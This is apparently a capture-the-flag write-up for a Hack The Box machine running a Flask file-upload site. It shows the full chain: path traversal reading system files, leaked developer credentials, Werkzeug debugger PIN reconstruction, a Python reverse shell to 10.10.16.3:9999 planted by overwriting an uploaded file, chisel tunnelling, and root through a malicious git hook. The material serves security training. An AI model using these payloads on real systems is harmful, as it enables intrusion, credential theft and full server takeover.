> Author: **[irogir][author-profile]**

## Discovery

### Services

```shell
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 1e:59:05:7c:a9:58:c9:23:90:0f:75:23:82:3d:05:5f (RSA)
|   256 48:a8:53:e7:e0:08:aa:1d:96:86:52:bb:88:56:a0:b7 (ECDSA)
|_  256 02:1f:97:9e:3c:8e:7a:1c:7c:af:9d:5a:25:4b:b8:c8 (ED25519)
80/tcp   open     http    Werkzeug/2.1.2 Python/3.10.3
|_http-server-header: Werkzeug/2.1.2 Python/3.10.3
|_http-title: upcloud - Upload files for Free!
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.10.3
|     Date: Mon, 06 Jun 2022 17:16:28 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 5316
|     Connection: close
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>upcloud - Upload files for Free!</title>
|     <script src="/static/vendor/jquery/jquery-3.4.1.min.js"></script>
|     <script src="/static/vendor/popper/popper.min.js"></script>
|     <script src="/static/vendor/bootstrap/js/bootstrap.min.js"></script>
|     <script src="/static/js/ie10-viewport-bug-workaround.js"></script>
|     <link rel="stylesheet" href="/static/vendor/bootstrap/css/bootstrap.css"/>
|     <link rel="stylesheet" href=" /static/vendor/bootstrap/css/bootstrap-grid.css"/>
|     <link rel="stylesheet" href=" /static/vendor/bootstrap/css/bootstrap-reboot.css"/>
|     <link rel=
|   HTTPOptions:
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.10.3
|     Date: Mon, 06 Jun 2022 17:16:28 GMT
|     Content-Type: text/html; charset=utf-8
|     Allow: HEAD, GET, OPTIONS
|     Content-Length: 0
|     Connection: close
|   RTSPRequest:
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
3000/tcp filtered ppp
```

```shell
PORT   STATE         SERVICE
68/udp open|filtered dhcpc
```

### Web browsing

"upcloud" offers to host files, no BS:

![][upload]

It is supposedly barebone:

![][kiss]

And secured by a well meaning community ofc, so the sources are open to all!

## Digging in the code history

There a big emphasis on the debug mode in the sources:

```shell
git diff HEAD~ HEAD
#  # Set mode
#  ENV MODE="PRODUCTION"
# -# ENV FLASK_DEBUG=1
cat app/app/configuration.py
# class DevelopmentConfig(Config):
#     DEBUG = True
# class TestingConfig(Config):
#     TESTING = True
#     DEBUG = True
```

In debug mode, there's a web accessible at `/console`. It is password protected but the [pin is guessable][hacktricks-pin].

![][debug-console]

There's a dev branch too:

```shell
git branch -a
# * dev
#   public
git diff a76f8f75f7a4a12b706b0cf9c983796fa1985820 be4da71987bbbc8fae7c961fb2de01ebd0be1997
# --- a/app/.vscode/settings.json
# +++ /dev/null
# @@ -1,5 +0,0 @@
# -{
# -  "python.pythonPath": "/home/dev01/.virtualenvs/flask-app-b5GscEs_/bin/python",
# -  "http.proxy": "http://dev01:Soulless_Developer#2022@10.10.10.128:5187/",
# -  "http.proxyStrictSSL": false
# -}
```

> dev01 Soulless_Developer#2022

## Reading server files

Still it is a lot of word, especially with an LFI just out of reach:

```python
@app.route('/uploads/<path:path>')
def send_report(path):
    path = get_file_name(path)
    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))
```

The function `get_file_name` performs a little sanitization though:

```python
def get_file_name(unsafe_filename):
    return recursive_replace(unsafe_filename, "../", "")

def recursive_replace(search, replace_me, with_me):
    if replace_me not in search:
        return search
    return recursive_replace(search.replace(replace_me, with_me), replace_me, with_me)
```

But `os.path.join` overwrites the first arguments when there's an absolute path:

```
GET /uploads/..//etc/passwd HTTP/1.1
```

```
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
```

## Unlocking the web shell

### Getting the sources

Now that we have LFI, we can easily read the sources and reproduce the PIN generation.

The error page leaks the code location:

```
/usr/local/lib/python3.10/site-packages/flask/app.py
```

More informations:

```shell
GET /uploads/..//proc/self/cmdline HTTP/1.1
# /usr/local/bin/python/app/run.py
GET /uploads/..//proc/self/environ HTTP/1.1
# PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binHOSTNAME=4bfe62d7ea1eLANG=C.UTF-8GPG_KEY=A035C8C19219BA821ECEA86B64E628F8D684696DPYTHON_VERSION=3.10.3PYTHON_PIP_VERSION=22.0.4PYTHON_SETUPTOOLS_VERSION=58.1.0PYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/38e54e5de07c66e875c11a1ebbdb938854625dd8/public/get-pip.pyPYTHON_GET_PIP_SHA256=e235c437e5c7d7524fbce3880ca39b917a73dc565e0c813465b7a7a329bb279aPYTHONDONTWRITEBYTECODE=1MODE=PRODUCTIONFLASK_DEBUG=1HOME=/rootSUPERVISOR_ENABLED=1SUPERVISOR_PROCESS_NAME=flaskSUPERVISOR_GROUP_NAME=flaskWERKZEUG_SERVER_FD=3WERKZEUG_RUN_MAIN=true
GET uploads/..//proc/self/loginuid HTTP/1.1
# 4294967295
```

The environment has `HOME=/root` in it!

Also, LFI allows us to get to the PIN generation function at `/uploads/..//usr/local/lib/python3.10/site-packages/werkzeug/debug/__init__.py`:

```python
def get_pin_and_cookie_name(
    app: "WSGIApplication",
) -> t.Union[t.Tuple[str, str], t.Tuple[None, None]]:
    """Given an application object this returns a semi-stable 9 digit pin
    code and a random key.  The hope is that this is stable between
    restarts to not make debugging particularly frustrating.  If the pin
    was forcefully disabled this returns `None`.

    Second item in the resulting tuple is the cookie name for remembering.
    """
```

### Collecting the bits

The required informations are:

- the user name: `username = getpass.getuser()`
- the module name: `modname = getattr(app, "__module__", t.cast(object, app).__class__.__module__)`
- the app name: `getattr(app, "__name__", type(app).__name__)`
- the mod file: `getattr(mod, "__file__", None)`
- the node UUID: `str(uuid.getnode())`
- the machine ID: `get_machine_id()`

The username should be `root`, according to the env variables.

Running the app in a Docker container, we can inspect the running app and find:

- the module name: "flask.app"
- the app name: "Flask"

The module file is displayed in error messages: "/usr/local/lib/python3.10/site-packages/flask/app.py".

The node UUID is actually the MAC address interpreted as a number. It is readable in the system files:

```shell
GET uploads/..//proc/net/arp HTTP/1.1
# IP address       HW type     Flags       HW address            Mask     Device
# 172.17.0.1       0x1         0x2         02:42:9b:2a:8f:43     *        eth0
GET uploads/..//sys/class/net/eth0/address HTTP/1.1
# 02:42:ac:11:00:04
```

And finally, Werkzeug produces the machine ID by reading from a few files:

```shell
GET uploads/..//etc/machine-id HTTP/1.1
# FileNotFoundError: [Errno 2] No such file or directory: '/etc/machine-id'
GET uploads/..//proc/sys/kernel/random/boot_id HTTP/1.1
# 98a25343-6e4d-475e-bdfd-9fbb93cd682c
GET uploads/..//proc/self/cgroup HTTP/1.1
# 12:cpuset:/docker/ae45183507f9f2356400ddcc5309795d515f733553f6a82d533f5c3692b0d8ab
```

The first hit is the machine ID, here it's "98a25343-6e4d-475e-bdfd-9fbb93cd682c".

### Generating the pin

Once cleaned / factored, the function that generates the pin is quite straightforward:

```python
def generate_pin(username, modname, appname, modfile, nodeuuid, machineid) -> str:

    h = hashlib.sha1()
    for bits in [username, modname, appname, modfile, nodeuuid, machineid]:
        h.update(bits)
    h.update(b"cookiesalt")

    h.update(b"pinsalt")
    num = f"{int(h.hexdigest(), 16):09d}"[:9]

    return "-".join(
        num[x : x + 3].rjust(3, "0")
        for x in range(0, len(num), 3))
```

> Debugger PIN: 952-746-163

This worked on my local Docker container but not on the box!

## Uploading a reverse shell

Actually the path injection works on the upload function too:

```python
file_name = get_file_name(f.filename)
file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
f.save(file_path)
```

So we can just overwrite files and plant a reverse shell into `/app/app/views.py`:

```python
from os import dup2 as o;
from socket import socket as b;
from subprocess import call as p;

s = b();
s.connect(("10.10.16.3",9999));
f = s.fileno;
o(f(),0);
o(f(),1);
o(f(),2);
p(["/bin/sh","-i"]);
```

And also leak the information required for the PIN:

![][pin-leak]

Which leads to the PIN:

> `142-736-817`

The machine ID was actually the concatenation of `/proc/sys/kernel/random/boot_id` and `/proc/self/cgroup`

## Breaking out of the container

Inside the container, the filtered port 3000 from earlier is now open:

```shell
for p in `seq 1 65535`; do nc -znv 172.17.0.1 "$p"; done
# 172.17.0.1 (172.17.0.1:22) open
# 172.17.0.1 (172.17.0.1:80) open
# 172.17.0.1 (172.17.0.1:3000) open
# 172.17.0.1 (172.17.0.1:6000) open
# 172.17.0.1 (172.17.0.1:6001) open
# 172.17.0.1 (172.17.0.1:6002) open
# 172.17.0.1 (172.17.0.1:6003) open
# 172.17.0.1 (172.17.0.1:6004) open
# 172.17.0.1 (172.17.0.1:6005) open
# 172.17.0.1 (172.17.0.1:6006) open
# 172.17.0.1 (172.17.0.1:6007) open
```

Let's tunnel the traffic:

```shell
# attacker side: chisel will create a proxy on 127.0.0.1:1080 (not 8888)
chisel server -p 8888 --reverse
# container side
chisel client 10.10.16.3:8888 R:socks
# and access it
chromium --proxy-server="socks5://localhost:1080"
```

`172.17.0.1:3000` is running Gitea:

![][gitea]

And there's the soulless dev01 registered: the credentials work and it has a "home backup" repository and `.ssh` is in it.

## Root

There's a cron job periodically commiting the new content in `/home/dev01`. It uses git and runs as root.

Let's hook the flag:

```shell
printf '#/bin/bash\ncat /root/root.txt > /tmp/flag\nchown dev01:dev01 /tmp/flag\n' > .git/hooks/pre-commit
chmod +x .git/hooks/pre-commit
```

Voilà :)

[author-profile]: https://app.hackthebox.com/users/476556
[debug-console]: images/debug-console.png
[gitea]: images/gitea.png
[hacktricks-pin]: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug
[pin-leak]: images/pin-leak.png

